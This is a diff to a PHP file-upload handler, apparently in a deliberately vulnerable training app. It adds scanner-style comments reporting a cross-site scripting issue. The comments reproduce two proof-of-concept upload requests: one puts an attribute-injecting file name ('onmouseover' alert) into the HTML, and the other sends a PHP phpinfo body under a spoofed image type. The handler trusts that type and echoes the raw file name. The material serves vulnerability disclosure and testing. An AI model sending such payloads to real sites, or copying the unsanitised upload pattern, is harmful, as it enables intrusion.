@@ -33,6 +33,50 @@
 					$destination = 'uploads/' . $_FILES['userfile']['name'];
 					if (($img_type == 'image/png') || ($img_type == 'image/jpeg')  ) {
 						if (move_uploaded_file($_FILES['userfile']['tmp_name'],$destination)) {
+							// TODO: AI issue #3, High, Cross-site Scripting, https://github.com/rbm1718/bricks/issues/3
+							//
+							// POST /upload-3/index.php HTTP/1.1
+							// Host: localhost
+							// Accept-Encoding: identity
+							// Connection: close
+							// Content-Length: 296
+							// Content-Type: multipart/form-data; boundary=08ad89b3b05648639823918c7beaa68c
+							//
+							// --08ad89b3b05648639823918c7beaa68c
+							// Content-Disposition: form-data; name="upload"
+							//
+							// 935137890000
+							// --08ad89b3b05648639823918c7beaa68c
+							// Content-Disposition: form-data; name="userfile"; filename="'onmouseover='alert(1)'"
+							// Content-Type: image/png
+							//
+							// <?php phpinfo(); ?>
+							// --08ad89b3b05648639823918c7beaa68c--
+							//
+							//
+							// move_uploaded_file($_FILES['userfile']['tmp_name'], ('uploads/' . $_FILES['userfile']['name']))
+							// TODO: AI issue #3, High, Cross-site Scripting, https://github.com/rbm1718/bricks/issues/3
+							//
+							// POST /upload-3/index.php HTTP/1.1
+							// Host: localhost
+							// Accept-Encoding: identity
+							// Connection: close
+							// Content-Length: 297
+							// Content-Type: multipart/form-data; boundary=a4dffa42978746c18b9e7d53a345a60b
+							//
+							// --a4dffa42978746c18b9e7d53a345a60b
+							// Content-Disposition: form-data; name="upload"
+							//
+							// 935137890000
+							// --a4dffa42978746c18b9e7d53a345a60b
+							// Content-Disposition: form-data; name="userfile"; filename="'onmouseover='alert(1)'"
+							// Content-Type: image/jpeg
+							//
+							// <?php phpinfo(); ?>
+							// --a4dffa42978746c18b9e7d53a345a60b--
+							//
+							//
+							// move_uploaded_file($_FILES['userfile']['tmp_name'], ('uploads/' . $_FILES['userfile']['name']))
 							echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
 						}
 					} else {
